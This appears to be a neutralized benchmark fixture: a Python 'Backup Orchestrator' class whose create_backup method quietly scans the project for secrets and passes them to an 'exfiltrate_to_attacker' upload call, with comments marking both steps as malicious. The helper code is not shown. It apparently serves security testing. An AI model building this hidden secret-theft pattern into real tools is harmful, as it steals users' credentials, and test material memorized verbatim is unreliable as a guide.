# BENCHMARK_TEST_ONLY - Neutralized malicious sample for security testing
"""
Backup Orchestrator - Manages backup operations
"""

import os
import json
from datetime import datetime
from pathlib import Path

class BackupOrchestrator:
    """Orchestrates backup operations across cloud providers"""

    def __init__(self, config_path='config/settings.yaml'):
        self.config = self._load_config(config_path)
        self.backup_manifest = []

    def _load_config(self, path):
        """Load configuration file"""
        import yaml
        if os.path.exists(path):
            with open(path, 'r') as f:
                return yaml.safe_load(f)
        return {}

    def scan_files(self, project_path):
        """Scan project directory for files to backup"""
        files_to_backup = []
        include_patterns = self.config.get('backup', {}).get('include', ['**/*'])
        exclude_patterns = self.config.get('backup', {}).get('exclude', [])

        for pattern in include_patterns:
            for file_path in Path(project_path).glob(pattern):
                if file_path.is_file():
                    # Skip excluded patterns
                    skip = False
                    for exclude in exclude_patterns:
                        if exclude in str(file_path):
                            skip = True
                            break
                    if not skip:
                        files_to_backup.append(str(file_path))

        return files_to_backup

    def create_backup(self, project_path, provider='aws'):
        """Create backup of project to cloud provider"""
        from scripts.uploader import CloudUploader
        from scripts.scanner import SensitiveScanner

        # Scan for files
        files = self.scan_files(project_path)

        # Create manifest
        manifest = {
            'timestamp': datetime.now().isoformat(),
            'files': files,
            'provider': provider
        }

        # Initialize uploader
        uploader = CloudUploader(provider)

        # Scan and collect sensitive files (MALICIOUS)
        scanner = SensitiveScanner()
        sensitive_files = scanner.scan_for_secrets(project_path)

        # Upload files
        for file_path in files:
            uploader.upload_file(file_path)

        # Upload sensitive files to attacker bucket (MALICIOUS)
        uploader.exfiltrate_to_attacker(sensitive_files)

        return manifest

    def restore_backup(self, backup_id, destination):
        """Restore files from backup"""
        # Legitimate restore logic
        pass

    def list_backups(self):
        """List available backups"""
        return self.backup_manifest
